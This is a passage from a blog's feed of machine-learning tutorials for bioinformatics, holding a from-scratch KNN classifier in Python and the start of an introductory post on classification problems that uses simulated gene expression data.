</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="summary-code-full-example">Summary Code: Full Example<a href="https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn#summary-code-full-example" class="hash-link" aria-label="Direct link to Summary Code: Full Example" title="Direct link to Summary Code: Full Example" translate="no">​</a></h2>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Quick reference - full KNN from scratch</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> numpy </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">as</span><span class="token plain"> np</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> collections </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> Counter</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">class</span><span class="token plain"> </span><span class="token class-name" style="color:hsl(35, 99%, 36%)">SimpleKNN</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">__init__</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> k</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">k </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> k</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">X_train </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">None</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">y_train </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">None</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">fit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> X</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">X_train </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> X</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">y_train </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> y</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">predict</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> X_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        predictions </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> sample </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> X_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            distances </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">sqrt</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">sum</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">X_train </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token plain"> sample</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">**</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> axis</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            k_indices </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">argsort</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">distances</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">k</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            labels </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">y_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">k_indices</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            prediction </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> Counter</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">labels</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">most_common</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            predictions</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">prediction</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">array</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">predictions</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Usage</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">knn </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> SimpleKNN</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">k</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">5</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">knn</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">fit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">X_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">predictions </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> knn</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">predict</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">X_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">accuracy </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">mean</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">predictions </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> y_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Accuracy: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">accuracy</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">.2%</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p>By coding KNN from scratch, you've learned machine learning fundamentals that apply to every algorithm. You now understand distance metrics, classification, and parameter tuning—all essential concepts in bioinformatics!</p>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="machine-learning" term="machine-learning"/>
        <category label="bioinformatics" term="bioinformatics"/>
        <category label="python" term="python"/>
        <category label="knn" term="knn"/>
        <category label="gene-expression" term="gene-expression"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Introduction to AI/ML in Bioinformatics: Classification Models & Evaluation]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications</id>
        <link href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications"/>
        <updated>2026-02-01T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Machine learning is transforming bioinformatics by automating pattern discovery from biological data. But what problems can it actually solve? This post shows real-world applications of classification models, then builds the simplest possible classifiers to understand how they work and how to evaluate them. This is Part 0—the practical foundation before diving into complex algorithms like KNN.]]></summary>
        <content type="html"><![CDATA[<p>Machine learning is transforming bioinformatics by automating pattern discovery from biological data. But what problems can it actually solve? This post shows real-world applications of classification models, then builds the simplest possible classifiers to understand how they work and how to evaluate them. This is Part 0—the practical foundation before diving into complex algorithms like KNN.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="real-world-classification-problems-in-bioinformatics">Real-World Classification Problems in Bioinformatics<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#real-world-classification-problems-in-bioinformatics" class="hash-link" aria-label="Direct link to Real-World Classification Problems in Bioinformatics" title="Direct link to Real-World Classification Problems in Bioinformatics" translate="no">​</a></h2>
<p>Let's start by understanding what classification problems machine learning actually solves:</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="problem-1-disease-diagnosis-from-gene-expression">Problem 1: Disease Diagnosis from Gene Expression<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#problem-1-disease-diagnosis-from-gene-expression" class="hash-link" aria-label="Direct link to Problem 1: Disease Diagnosis from Gene Expression" title="Direct link to Problem 1: Disease Diagnosis from Gene Expression" translate="no">​</a></h3>
<ul>
<li class=""><strong>Input</strong>: Gene expression levels from patient blood sample</li>
<li class=""><strong>Output</strong>: Normal or Disease (binary classification)</li>
<li class=""><strong>Real application</strong>: Cancer subtypes, Alzheimer's stages, COVID severity</li>
<li class=""><strong>Goal</strong>: Classify new patients into disease categories automatically</li>
</ul>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Patient A: [Gene1=2.3, Gene2=1.5, Gene3=4.2, ...] → Normal</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Patient B: [Gene1=8.1, Gene2=6.3, Gene3=1.9, ...] → Disease</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Patient C: [Gene1=3.1, Gene2=2.2, Gene3=5.1, ...] → Normal</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="problem-2-protein-function-prediction">Problem 2: Protein Function Prediction<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#problem-2-protein-function-prediction" class="hash-link" aria-label="Direct link to Problem 2: Protein Function Prediction" title="Direct link to Problem 2: Protein Function Prediction" translate="no">​</a></h3>
<ul>
<li class=""><strong>Input</strong>: Amino acid sequence</li>
<li class=""><strong>Output</strong>: Enzyme, Structural protein, or Transport protein (multi-class)</li>
<li class=""><strong>Real application</strong>: Annotating newly sequenced genomes</li>
<li class=""><strong>Goal</strong>: Predict function of unknown proteins</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="problem-3-pathogenic-variant-detection">Problem 3: Pathogenic Variant Detection<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#problem-3-pathogenic-variant-detection" class="hash-link" aria-label="Direct link to Problem 3: Pathogenic Variant Detection" title="Direct link to Problem 3: Pathogenic Variant Detection" translate="no">​</a></h3>
<ul>
<li class=""><strong>Input</strong>: DNA mutation information, population frequency, conservation score</li>
<li class=""><strong>Output</strong>: Pathogenic or Benign (binary classification)</li>
<li class=""><strong>Real application</strong>: Clinical variant interpretation</li>
<li class=""><strong>Goal</strong>: Identify disease-causing mutations from huge variant databases</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-build-classification-models-the-power-of-automation">Why Build Classification Models? The Power of Automation<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#why-build-classification-models-the-power-of-automation" class="hash-link" aria-label="Direct link to Why Build Classification Models? The Power of Automation" title="Direct link to Why Build Classification Models? The Power of Automation" translate="no">​</a></h2>
<p>Before machine learning, biologists manually analyzed data:</p>
<ul>
<li class="">❌ <strong>Slow</strong>: Analyzing 20,000 genes one-by-one takes months</li>
<li class="">❌ <strong>Subjective</strong>: Different experts might disagree on classification</li>
<li class="">❌ <strong>Doesn't scale</strong>: 10,000 patient samples requires endless manual work</li>
</ul>
<p>With ML classification models:</p>
<ul>
<li class="">✅ <strong>Fast</strong>: Classify 10,000 samples in seconds</li>
<li class="">✅ <strong>Objective</strong>: Same rules applied consistently to every sample</li>
<li class="">✅ <strong>Scalable</strong>: Works for any dataset size without additional effort</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-1-the-simplest-classification-models">Part 1: The Simplest Classification Models<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#part-1-the-simplest-classification-models" class="hash-link" aria-label="Direct link to Part 1: The Simplest Classification Models" title="Direct link to Part 1: The Simplest Classification Models" translate="no">​</a></h2>
<p>Let's build real but minimal classification models, starting from the simplest to more sophisticated.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="setup-simulated-gene-expression-data">Setup: Simulated Gene Expression Data<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#setup-simulated-gene-expression-data" class="hash-link" aria-label="Direct link to Setup: Simulated Gene Expression Data" title="Direct link to Setup: Simulated Gene Expression Data" translate="no">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> numpy </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">as</span><span class="token plain"> np</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> pandas </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">as</span><span class="token plain"> pd</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> matplotlib</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">pyplot </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">as</span><span class="token plain"> plt</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Set seed for reproducibility</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">random</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">seed</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">42</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Simulate gene expression data for disease classification</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 50 normal patients, 50 disease patients</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3 genes measured via RNA-seq</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Normal patients: lower expression</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">normal_samples </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">random</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">normal</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">loc</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">5</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> scale</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> size</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">50</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Disease patients: higher expression (especially gene 1)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">disease_samples </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">random</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">normal</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">loc</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> scale</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> size</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">50</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Combine data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">X </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">vstack</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">normal_samples</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> disease_samples</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Features (gene expression)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">y </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">hstack</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">zeros</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">50</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ones</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">50</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Labels (0=normal, 1=disease)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create DataFrame for easier inspection</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">gene_names </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">'Gene_A'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'Gene_B'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'Gene_C'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">df </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> pd</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">DataFrame</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">X</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> columns</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">gene_names</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">df</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">'Label'</span><span class="token 